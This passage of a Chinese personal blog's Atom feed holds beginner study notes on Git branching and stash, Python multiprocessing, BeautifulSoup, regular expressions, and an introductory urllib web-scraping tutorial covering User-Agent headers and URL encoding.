&lt;name&gt;</code>或者<code>git switch &lt;name&gt;</code></p><p>创建+切换分支：<code>git checkout -b &lt;name&gt;</code>或者<code>git switch -c &lt;name&gt;</code></p><p>合并某分支到当前分支：<code>git merge &lt;name&gt;</code></p><p>删除分支：<code>git branch -d &lt;name&gt;</code></p><h3 id="解决合并分支的冲突"><a href="#解决合并分支的冲突" class="headerlink" title="解决合并分支的冲突"></a>解决合并分支的冲突</h3><p>用带参数的<code>git log</code>也可以看到分支的合并情况：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git log --graph --pretty=oneline --abbrev-commit</span><br></pre></td></tr></table></figure><p><img src="/2024/02/16/Git-learning/image-20240216202709111.png" alt="image-20240216202709111"></p><h3 id="分支管理策略"><a href="#分支管理策略" class="headerlink" title="分支管理策略"></a>分支管理策略</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git merge --no-ff -m &quot;merge with no-ff&quot; dev</span><br></pre></td></tr></table></figure><p>强制禁用<code>Fast forward</code>模式，Git就会在merge时生成一个新的commit，这样，从分支历史上就可以看出分支信息。</p><h3 id="Bug分支"><a href="#Bug分支" class="headerlink" title="Bug分支"></a>Bug分支</h3><p>当前正在<code>dev</code>上进行的工作还没有提交，但是，必须在两个小时内修复该bug。</p><p>Git还提供了一个<code>stash</code>功能，可以把当前工作现场“储藏”起来，等以后恢复现场后继续工作：</p><p><img src="/2024/02/16/Git-learning/image-20240216205936280.png" alt="image-20240216205936280"></p><p>首先确定要在哪个分支上修复bug，假定需要在<code>master</code>分支上修复，就从<code>master</code>创建临时分支：</p><p>修改好bug之后<code>git add .</code>, <code>git commit -m &quot;xxx&quot;</code>, 回到master branch 进行合并， <code>git merge --no-ff -m &quot;xxx&quot; issue-101</code>, <code>git branch -d issue-101</code></p><p>然后回到工作现场<code>git switch dev</code>, </p><ul><li><code>git stash list</code>查看保存的工作现场</li></ul><h4 id="恢复工作现场"><a href="#恢复工作现场" class="headerlink" title="恢复工作现场"></a>恢复工作现场</h4><ol><li><code>git stash apply</code>: 但是恢复后，stash内容并不删除，你需要用<code>git stash drop</code>来删除；</li><li>另一种方式是用<code>git stash pop</code>，恢复的同时把stash内容也删了：</li></ol><p><img src="/2024/02/16/Git-learning/image-20240216211356780.png" alt="image-20240216211356780"></p><p>在master分支上修复了bug后，我们要想一想，dev分支是早期从master分支分出来的，所以，这个bug其实在当前dev分支上也存在。</p><p>同样的bug，要在dev上修复，我们只需要把<code>fix bug 101</code>这个提交所做的修改“复制”到dev分支。注意：我们只想复制<code> fix bug 101</code>这个提交所做的修改，并不是把整个master分支merge过来。</p><p>为了方便操作，Git专门提供了一个<code>cherry-pick</code>命令，让我们能复制一个特定的提交到当前分支：</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[toc]&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.liaoxuefeng.com/wiki/896043488029600/896827951938304&quot;&gt;创建版本库 - 廖雪峰的官方网站 (liaoxuefeng.com)&lt;/a&gt;&lt;/p&gt;
&lt;h1 id</summary>
      
    
    
    
    <category term="工具" scheme="https://1xueyu1.github.io/categories/%E5%B7%A5%E5%85%B7/"/>
    
    
    <category term="Git" scheme="https://1xueyu1.github.io/tags/Git/"/>
    
  </entry>
  
  <entry>
    <title>多进程</title>
    <link href="https://1xueyu1.github.io/2024/02/07/%E5%A4%9A%E8%BF%9B%E7%A8%8B/"/>
    <id>https://1xueyu1.github.io/2024/02/07/%E5%A4%9A%E8%BF%9B%E7%A8%8B/</id>
    <published>2024-02-07T13:24:29.000Z</published>
    <updated>2024-02-07T14:52:17.648Z</updated>
    
    <content type="html"><![CDATA[<h2 id="多进程"><a href="#多进程" class="headerlink" title="多进程"></a>多进程</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> multiprocessing.pool <span class="keyword">import</span> Pool</span><br><span class="line"></span><br><span class="line"><span class="comment"># 多进程爬取</span></span><br><span class="line">    pool = Pool(<span class="number">5</span>)</span><br><span class="line">    pool.<span class="built_in">map</span>(handle, urls)</span><br><span class="line">    pool.close()</span><br><span class="line">    pool.join()</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;多进程&quot;&gt;&lt;a href=&quot;#多进程&quot; class=&quot;headerlink&quot; title=&quot;多进程&quot;&gt;&lt;/a&gt;多进程&lt;/h2&gt;&lt;figure class=&quot;highlight python&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;</summary>
      
    
    
    
    <category term="python" scheme="https://1xueyu1.github.io/categories/python/"/>
    
    <category term="爬虫" scheme="https://1xueyu1.github.io/categories/python/%E7%88%AC%E8%99%AB/"/>
    
    
  </entry>
  
  <entry>
    <title>bs4解析</title>
    <link href="https://1xueyu1.github.io/2024/02/07/bs4%E8%A7%A3%E6%9E%90/"/>
    <id>https://1xueyu1.github.io/2024/02/07/bs4%E8%A7%A3%E6%9E%90/</id>
    <published>2024-02-07T12:34:01.000Z</published>
    <updated>2024-02-07T14:52:20.575Z</updated>
    
    <content type="html"><![CDATA[<h2 id="BeautifulSoup学习"><a href="#BeautifulSoup学习" class="headerlink" title="BeautifulSoup学习"></a>BeautifulSoup学习</h2><ol><li><p>安装：</p><blockquote><p>pip install bs4</p><p>pip install lxml</p></blockquote></li><li><p>使用</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">from bs4 import BeautifulSoup</span><br><span class="line"></span><br><span class="line"><span class="section"># 对象实例化</span></span><br><span class="line"><span class="code"># 1.加载本地html文件</span></span><br><span class="line"><span class="code">    fp = open(&quot;./xxx.html&quot;, &#x27;r&#x27;, encoding=&#x27;utf-8&#x27;)</span></span><br><span class="line"><span class="code">    soup = BeautifulSoup(fp, &#x27;lxml&#x27;)</span></span><br><span class="line"><span class="code">    # 2.将获取到的页面加载到对象</span></span><br><span class="line"><span class="code">    page_text = response.text</span></span><br><span class="line"><span class="code">    soup = BeautifulSoup(page_text, &#x27;lxml&#x27;)</span></span><br><span class="line"><span class="code"># 用于数据解析的方法和属性</span></span><br><span class="line"><span class="code">- soup.tagName: 返回文档中第一次出现的tagName标签</span></span><br><span class="line"><span class="code">- soup.find():</span></span><br><span class="line"><span class="code">- find(&#x27;tagName&#x27;): 等同于soup.tagName</span></span><br><span class="line"><span class="code">- 属性定位: soup.find(&#x27;div&#x27;, class_/id/attr = &quot;value&quot;)</span></span><br><span class="line"><span class="code">- soup.find_all(&quot;tagName&quot;):返回所有标签(列表)</span></span><br><span class="line"><span class="code">- select:</span></span><br><span class="line"><span class="code">- soup.select(&quot;某种选择器(id, class, 标签...选择器)&quot;)： 返回一个列表</span></span><br><span class="line"><span class="code">- 层级选择：</span></span><br><span class="line"><span class="code">soup.select(&quot;.tang &gt; ul &gt; li &gt; a&quot;): &gt; 表示一个层级</span></span><br><span class="line"><span class="code">soup.select(&quot;.tang &gt; ul a&quot;): 空格表示多个层级</span></span><br><span class="line"><span class="code"> - 获取标签之间的文本数据:</span></span><br><span class="line"><span class="code">  - soup.a.text/string/get_text()</span></span><br><span class="line"><span class="code">  - text/get_text(): 可以获取某一个标签中的所有的文本内容</span></span><br><span class="line"><span class="code">  - string：只能获取标签下直系的内容</span></span><br><span class="line"><span class="code"> - 获取标签中的属性值:</span></span><br><span class="line"><span class="code">  - soup.a[&#x27;href&#x27;]</span></span><br><span class="line"><span class="code"></span></span><br><span class="line"><span class="code">    </span></span><br></pre></td></tr></table></figure></li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;BeautifulSoup学习&quot;&gt;&lt;a href=&quot;#BeautifulSoup学习&quot; class=&quot;headerlink&quot; title=&quot;BeautifulSoup学习&quot;&gt;&lt;/a&gt;BeautifulSoup学习&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;&lt;p&gt;安装：&lt;/p&gt;
&lt;</summary>
      
    
    
    
    <category term="python" scheme="https://1xueyu1.github.io/categories/python/"/>
    
    <category term="爬虫" scheme="https://1xueyu1.github.io/categories/python/%E7%88%AC%E8%99%AB/"/>
    
    
  </entry>
  
  <entry>
    <title>正则表达式</title>
    <link href="https://1xueyu1.github.io/2024/02/07/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/"/>
    <id>https://1xueyu1.github.io/2024/02/07/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/</id>
    <published>2024-02-07T09:45:37.000Z</published>
    <updated>2024-02-07T11:44:11.704Z</updated>
    
    <content type="html"><![CDATA[<h2 id="python使用"><a href="#python使用" class="headerlink" title="python使用"></a>python使用</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">content = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">苹果是红色的</span></span><br><span class="line"><span class="string">橙子是橙色的</span></span><br><span class="line"><span class="string">香蕉是黄色的</span></span><br><span class="line"><span class="string">乌鸦是黑色的</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="comment"># r表示原始字符串， 不对字符串中的符号进行转义</span></span><br><span class="line">p = re.<span class="built_in">compile</span>(<span class="string">r&#x27;.色&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> one <span class="keyword">in</span> p.findall(content):</span><br><span class="line">    <span class="built_in">print</span>(one)</span><br></pre></td></tr></table></figure><p>运行结果:</p><p><img src="/2024/02/07/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/image-20240207175308040.png" alt="image-20240207175308040"></p><h2 id="符号含义"><a href="#符号含义" class="headerlink" title="符号含义"></a>符号含义</h2><ol><li><p><code>.</code>表示匹配除<code>\n</code>外的任何<strong>单个</strong>字符</p><p>·eg: <code>.色</code>可以匹配<code>黄色</code>, <code>绿色</code>等两个字符的</p></li><li><p><code>*</code>匹配前面的子表达式任意次，包括0</p><p>·eg:<code>,.*</code>匹配逗号后面的任意字符串</p><p><img src="/2024/02/07/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/image-20240207193324690.png" alt="image-20240207193324690"></p><p><img src="/2024/02/07/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/image-20240207193520269.png" alt="image-20240207193520269"></p></li><li><p><code>+</code>,和<code>*</code>类似，但是不包括0</p></li><li><p><code>&#123;&#125;</code>指定匹配次数</p><p>eg: 有{3， 4}匹配连续的 <strong>有</strong> 字，至少3次，至多4次</p></li></ol><h2 id="贪婪模式与非贪婪模式"><a href="#贪婪模式与非贪婪模式" class="headerlink" title="贪婪模式与非贪婪模式"></a>贪婪模式与非贪婪模式</h2><h3 id="贪婪模式"><a href="#贪婪模式" class="headerlink" title="贪婪模式"></a>贪婪模式</h3><p>src &#x3D; <code>‘&lt;html&gt;&lt;head&gt;&lt;title&gt;Title&lt;/title&gt;’</code></p><p>使用<code>&lt;.*&gt;</code>匹配到的结果是<code>‘&lt;html&gt;&lt;head&gt;&lt;title&gt;Title&lt;/title&gt;’</code></p><h3 id="非贪婪模式"><a href="#非贪婪模式" class="headerlink" title="非贪婪模式"></a>非贪婪模式</h3><p>使用<code>&lt;.*?&gt;</code>匹配到的结果是<code>[&#39;&lt;html&gt;&#39;, &#39;&lt;head&gt;&#39;, &#39;&lt;title&gt;&#39;, &#39;&lt;/title&gt;&#39;]</code></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;python使用&quot;&gt;&lt;a href=&quot;#python使用&quot; class=&quot;headerlink&quot; title=&quot;python使用&quot;&gt;&lt;/a&gt;python使用&lt;/h2&gt;&lt;figure class=&quot;highlight python&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td c</summary>
      
    
    
    
    <category term="python" scheme="https://1xueyu1.github.io/categories/python/"/>
    
    <category term="正则表达式" scheme="https://1xueyu1.github.io/categories/python/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/"/>
    
    
  </entry>
  
  <entry>
    <title>爬虫入门</title>
    <link href="https://1xueyu1.github.io/2024/01/27/%E7%88%AC%E8%99%AB/"/>
    <id>https://1xueyu1.github.io/2024/01/27/%E7%88%AC%E8%99%AB/</id>
    <published>2024-01-27T12:59:48.000Z</published>
    <updated>2024-02-06T14:05:02.743Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://c.biancheng.net/python_spider/useragent-pool.html">构建User-Agnet代理池 (biancheng.net)</a></p><h1 id="爬虫"><a href="#爬虫" class="headerlink" title="爬虫"></a>爬虫</h1><h2 id="获取网页html信息"><a href="#获取网页html信息" class="headerlink" title="获取网页html信息"></a>获取网页html信息</h2><h3 id="1-获取响应对象"><a href="#1-获取响应对象" class="headerlink" title="1) 获取响应对象"></a>1) 获取响应对象</h3><p>向百度（<a href="http://www.baidu.com/%EF%BC%89%E5%8F%91%E8%B5%B7%E8%AF%B7%E6%B1%82%EF%BC%8C%E8%8E%B7%E5%8F%96%E7%99%BE%E5%BA%A6%E9%A6%96%E9%A1%B5%E7%9A%84">http://www.baidu.com/）发起请求，获取百度首页的</a> HTML 信息，代码如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#导包,发起请求使用urllib库的request请求模块</span><br><span class="line">import urllib.request</span><br><span class="line"># urlopen()向URL发请求,返回响应对象,注意url必须完整response=urllib.request.urlopen(&#x27;http://www.baidu.com/&#x27;)</span><br><span class="line">print(response)</span><br></pre></td></tr></table></figure><p>上述代码会返回百度首页的响应对象， 其中 urlopen() 表示打开一个网页地址。注意：请求的 url 必须带有 http 或者 https 传输协议。</p><p>输出结果，如下所示：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;http.client.HTTPResponse object at 0x00000237E872EC20&gt;</span><br></pre></td></tr></table></figure><h3 id="2-输出HTML信息"><a href="#2-输出HTML信息" class="headerlink" title="2) 输出HTML信息"></a>2) 输出HTML信息</h3><p>在上述代码的基础上继续编写如下代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#提取响应内容</span><br><span class="line">html = response.read().decode(&#x27;utf-8&#x27;)</span><br><span class="line">#打印响应内容</span><br><span class="line">print(html)</span><br></pre></td></tr></table></figure><h2 id="常用方法"><a href="#常用方法" class="headerlink" title="常用方法"></a>常用方法</h2><p>在本节您认识了第一个爬虫库 urllib，下面关于 urllib 做简单总结。</p><h3 id="1-urlopen"><a href="#1-urlopen" class="headerlink" title="1) urlopen()"></a>1) urlopen()</h3><p>表示向网站发起请求并获取响应对象，如下所示：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">urllib.request.urlopen(url,timeout)</span><br></pre></td></tr></table></figure><p>urlopen() 有两个参数，说明如下：</p><ul><li>url：表示要爬取数据的 url 地址。</li><li>timeout：设置等待超时时间，指定时间内未得到响应则抛出超时异常。</li></ul><h3 id="2-Request"><a href="#2-Request" class="headerlink" title="2) Request()"></a>2) Request()</h3><p>该方法用于创建请求对象、包装请求头，比如重构 User-Agent（即用户代理，指用户使用的浏览器）使程序更像人类的请求，而非机器。重构 User-Agent 是爬虫和反爬虫斗争的第一步。在下一节会做详细介绍。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">urllib.request.Request(url,headers)</span><br></pre></td></tr></table></figure><p>参数说明如下：</p><ul><li>url：请求的URL地址。</li><li>headers：重构请求头。</li></ul><h3 id="3-html响应对象方法"><a href="#3-html响应对象方法" class="headerlink" title="3) html响应对象方法"></a>3) html响应对象方法</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">bytes = response.read() # read()返回结果为 bytes 数据类型</span><br><span class="line">string = response.read().decode() # decode()将字节串转换为 string 类型</span><br><span class="line">url = response.geturl() # 返回响应对象的URL地址</span><br><span class="line">code = response.getcode() # 返回请求时的HTTP响应码</span><br></pre></td></tr></table></figure><h3 id="4-编码解码操作"><a href="#4-编码解码操作" class="headerlink" title="4) 编码解码操作"></a>4) 编码解码操作</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#字符串转换为字节码</span><br><span class="line">string.encode(&quot;utf-8&quot;) </span><br><span class="line">#字节码转换为字符串</span><br><span class="line">bytes.decode(&quot;utf-8&quot;) </span><br></pre></td></tr></table></figure><h2 id="User-Agent（用户代理）是什么"><a href="#User-Agent（用户代理）是什么" class="headerlink" title="User-Agent（用户代理）是什么"></a>User-Agent（用户代理）是什么</h2><p>网站通过识别请求头中 User-Agent 信息来判断是否是爬虫访问网站。如果是，网站首先对该 IP 进行预警，对其进行重点监控，当发现该 IP 超过规定时间内的访问次数， 将在一段时间内禁止其再次访问网站。</p><h3 id="爬虫程序UA信息"><a href="#爬虫程序UA信息" class="headerlink" title="爬虫程序UA信息"></a>爬虫程序UA信息</h3><p>下面，通过向 HTTP 测试网站（<a href="http://httpbin.org/%EF%BC%89%E5%8F%91%E9%80%81">http://httpbin.org/）发送</a> GET 请求来查看请求头信息，从而获取爬虫程序的 UA。代码如下所示：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#导入模块import urllib.request#向网站发送get请求response=urllib.request.urlopen(&#x27;http://httpbin.org/get&#x27;)html = response.read().decode()print(html)</span><br></pre></td></tr></table></figure><p>程序运行后，输出的请求头信息如下所示：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;args&quot;: &#123;&#125;, </span><br><span class="line">  &quot;headers&quot;: &#123;</span><br><span class="line">    &quot;Accept-Encoding&quot;: &quot;identity&quot;, </span><br><span class="line">    &quot;Host&quot;: &quot;httpbin.org&quot;, </span><br><span class="line">    &quot;User-Agent&quot;: &quot;Python-urllib/3.10&quot;, </span><br><span class="line">    &quot;X-Amzn-Trace-Id&quot;: &quot;Root=1-65b50128-7255dfdc546e1ead1ac95545&quot;</span><br><span class="line">  &#125;, </span><br><span class="line">  &quot;origin&quot;: &quot;18.179.50.136&quot;, </span><br><span class="line">  &quot;url&quot;: &quot;http://httpbin.org/get&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>从输出结果可以看出，User-Agent 竟然是 Python-urllib&#x2F;3.10，这显然是爬虫程序访问网站。因此就需要重构 User-Agent，将其伪装成“浏览器”访问网站。</p><h3 id="重构爬虫UA信息"><a href="#重构爬虫UA信息" class="headerlink" title="重构爬虫UA信息"></a>重构爬虫UA信息</h3><p>下面使用<code>urllib.request.Request()</code>方法重构 User-Agent 信息，代码如下所示：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#导包,发起请求使用urllib库的request请求模块</span><br><span class="line">from urllib import request</span><br><span class="line"></span><br><span class="line">url = &#x27;http://httpbin.org/get&#x27;</span><br><span class="line">headers = &#123;</span><br><span class="line">    &#x27;User-Agent&#x27; : &#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/18.17763&#x27;</span><br><span class="line">&#125;</span><br><span class="line">req = request.Request(url=url,headers=headers)</span><br><span class="line">res = request.urlopen(req)</span><br><span class="line">html = res.read().decode(&#x27;utf-8&#x27;)</span><br><span class="line">print(html)</span><br></pre></td></tr></table></figure><p>程序的运行结果，如下所示：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;args&quot;: &#123;&#125;, </span><br><span class="line">  &quot;headers&quot;: &#123;</span><br><span class="line">    &quot;Accept-Encoding&quot;: &quot;identity&quot;, </span><br><span class="line">    &quot;Host&quot;: &quot;httpbin.org&quot;, </span><br><span class="line">    &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/18.17763&quot;, </span><br><span class="line">    &quot;X-Amzn-Trace-Id&quot;: &quot;Root=1-65b502da-15454e9b21a63a0272dec77b&quot;</span><br><span class="line">  &#125;, </span><br><span class="line">  &quot;origin&quot;: &quot;18.179.50.136&quot;, </span><br><span class="line">  &quot;url&quot;: &quot;http://httpbin.org/get&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="构建User-Agnet代理池"><a href="#构建User-Agnet代理池" class="headerlink" title="构建User-Agnet代理池"></a>构建User-Agnet代理池</h2><p>在编写爬虫程序时，一般都会构建一个 User-Agent （用户代理）池，就是把多个浏览器的 UA 信息放进列表中，然后再从中随机选择。构建用户代理池，能够避免总是使用一个 UA 来访问网站，因为短时间内总使用一个 UA 高频率访问的网站，可能会引起网站的警觉，从而封杀掉 IP。</p><h3 id="自定义UA代理池"><a href="#自定义UA代理池" class="headerlink" title="自定义UA代理池"></a>自定义UA代理池</h3><p>构建代理池的方法也非常简单，在您的 Pycharm 工作目录中定义一个 ua_info.py 文件，并将以下 UA 信息以列表的形式粘贴到该文件中，如下所示：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">ua_list = [</span><br><span class="line">    &#x27;Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Maxthon 2.0&#x27;,</span><br><span class="line">    &#x27;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_0) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.56 Safari/535.11&#x27;,</span><br><span class="line">    &#x27;User-Agent:Opera/9.80 (Windows NT 6.1; U; en) Presto/2.8.131 Version/11.11&#x27;,</span><br><span class="line">    &#x27;Mozilla/5.0 (Windows NT 6.1; rv:2.0.1) Gecko/20100101 Firefox/4.0.1&#x27;,</span><br><span class="line">    &#x27;Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)&#x27;,</span><br><span class="line">    &#x27;Mozilla/5.0 (Windows; U; Windows NT 6.1; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50&#x27;,</span><br><span class="line">    &#x27;Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0&#x27;,</span><br><span class="line">    &#x27; Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1&#x27;,</span><br><span class="line">    &#x27;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1&#x27;,</span><br><span class="line">    &#x27; Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:2.0.1) Gecko/20100101 Firefox/4.0.1&#x27;,</span><br><span class="line">]</span><br></pre></td></tr></table></figure><p>经过上述操作，用户代理池就构建成功。</p><h3 id="模块随机获取UA"><a href="#模块随机获取UA" class="headerlink" title="模块随机获取UA"></a>模块随机获取UA</h3><p>您也可以使用专门第三方的模块来随机获取浏览器 UA 信息，不过该模块需要单独安装，安装方式如下：</p><p>pip install fake-useragent</p><p>下载安装成功后，演示如下代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">from fake_useragent import UserAgent</span><br><span class="line">ua = UserAgent()</span><br><span class="line">print(ua.edge)</span><br><span class="line">print(ua.chrome)</span><br></pre></td></tr></table></figure><p>输出结果：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 Edg/116.0.1938.62</span><br><span class="line">Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36</span><br></pre></td></tr></table></figure><h2 id="URL基本组成"><a href="#URL基本组成" class="headerlink" title="URL基本组成"></a>URL基本组成</h2><p>URL 是由一些简单的组件构成，比如协议、域名、端口号、路径和查询字符串等，示例如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.biancheng.net/index?param=10</span><br></pre></td></tr></table></figure><p>路径和查询字符串之间使用问号<code>?</code>隔开。上述示例的域名为 <a href="http://www.biancheng.net,路径为/">www.biancheng.net，路径为</a> index，查询字符串为 param&#x3D;1。</p><p>URL 中规定了一些具有特殊意义的字符，常被用来分隔两个不同的 URL 组件，这些字符被称为<strong>保留字符</strong>。例如：</p><ul><li>冒号：用于分隔协议和主机组件，斜杠用于分隔主机和路径</li><li><code>?</code>：用于分隔路径和查询参数等。</li><li><code>=</code>用于表示查询参数中的键值对。</li><li><code>&amp;</code>符号用于分隔查询多个键值对。</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">其余常用的保留字符有：/ . ... # @ $ + ; %</span><br></pre></td></tr></table></figure><h3 id="Python实现编码与解码"><a href="#Python实现编码与解码" class="headerlink" title="Python实现编码与解码"></a>Python实现编码与解码</h3><p>Python 的标准库<code>urllib.parse</code>模块中提供了用来编码和解码的方法，分别是 urlencode() 与 unquote() 方法。</p><table><thead><tr><th>方法</th><th>说明</th></tr></thead><tbody><tr><td>urlencode()</td><td>该方法实现了对 url 地址的编码操作</td></tr><tr><td>unquote()</td><td>该方法将编码后的 url 地址进行还原，被称为解码</td></tr></tbody></table><h4 id="1-编码urlencode"><a href="#1-编码urlencode" class="headerlink" title="1) 编码urlencode()"></a>1) 编码urlencode()</h4><p>下面以百度搜索为例进行讲解。首先打开百度首页，在搜索框中输入“爬虫”，然后点击“百度一下”。当搜索结果显示后，此时地址栏的 URL 信息，如下所示：</p><blockquote><p><a href="https://www.baidu.com/s?wd=%E7%88%AC%E8%99%AB&rsv_spt=1&rsv_iqid=0xa3ca348c0001a2ab&issp=1&f=8&rsv_bp=1&rsv_idx=2&ie=utf-8&tn=baiduhome_pg&rsv_enter=1&rsv_dl=ib&rsv_sug3=8&rsv_sug1=7&rsv_sug7=101">https://www.baidu.com/s?wd=爬虫&amp;rsv_spt=1&amp;rsv_iqid=0xa3ca348c0001a2ab&amp;issp=1&amp;f=8&amp;rsv_bp=1&amp;rsv_idx=2&amp;ie=utf-8&amp;tn=baiduhome_pg&amp;rsv_enter=1&amp;rsv_dl=ib&amp;rsv_sug3=8&amp;rsv_sug1=7&amp;rsv_sug7=101</a></p></blockquote><p>可以看出 URL 中有很多的查询字符串，而第一个查询字符串就是“wd&#x3D;爬虫”，其中 wd 